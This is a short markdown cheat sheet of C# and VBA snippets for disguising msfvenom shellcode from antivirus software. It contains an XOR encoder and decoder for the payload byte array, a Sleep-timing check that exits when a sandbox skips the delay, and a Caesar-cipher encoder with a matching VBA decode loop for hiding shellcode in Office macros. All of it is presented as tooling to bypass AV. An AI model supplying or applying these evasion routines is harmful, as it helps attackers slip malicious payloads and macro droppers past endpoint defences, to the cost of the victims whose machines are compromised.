## C# Function to encode 'buf' payload from msfvenom to bypass AV


### Usage: XORencode(buf, 0x5f);  

``` Csharp

#
        public static void XORencode(byte[] _data, byte _key)
        {
            byte[] bufencoded = new byte[_data.Length];
            byte key = _key;



            for (int i = 0; i < _data.Length; i++)
            {
                bufencoded[i] = (_data[i] ^= key);
            }

            StringBuilder hex = new StringBuilder(bufencoded.Length * 2);
            foreach (byte b in bufencoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("Encoded: byte[] buf = new byte[{0}] {{ {1} }}", bufencoded.Length, hex.ToString().TrimEnd(','));
        }
        public static byte[] XORdecode(byte[] data, byte key)
        {
            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= key; // XOR again to get original
            }

            StringBuilder hex = new StringBuilder(data.Length * 2);
            foreach (byte b in data)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("decoded: byte[] buf = new byte[{0}] {{ {1} }}", data.Length, hex.ToString().TrimEnd(','));


            return data;
        }


```



## This is a sleep timer.  Used to delay loading and bypass AV

*** Sleep here is from the win32 API's ***

``` Csharp

    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
    if(t2 < 1.5)
    {
        return;
    }

```

<br><br>

## Ceasar cipher in C# of shellcode byte array to be used in VBA macros

*** Usage: Take array of bytes from this and 

``` CSharp

  byte[] encoded = new byte[buf.Length];
  for(int i = 0; i < buf.Length; i++)
  {
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
  }

  uint counter = 0;

  StringBuilder hex = new StringBuilder(encoded.Length * 2);
 foreach(byte b in encoded)
 {
   hex.AppendFormat("{0:D}, ", b);
   counter++;
   if(counter % 50 == 0)
   {
       hex.AppendFormat("_{0}", Environment.NewLine);
   }
 }
 Console.WriteLine("The payload is: " + hex.ToString());

```

*** VBA method to unceaser cipher above encrypted payload 

``` VBA

For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2
Next i

```
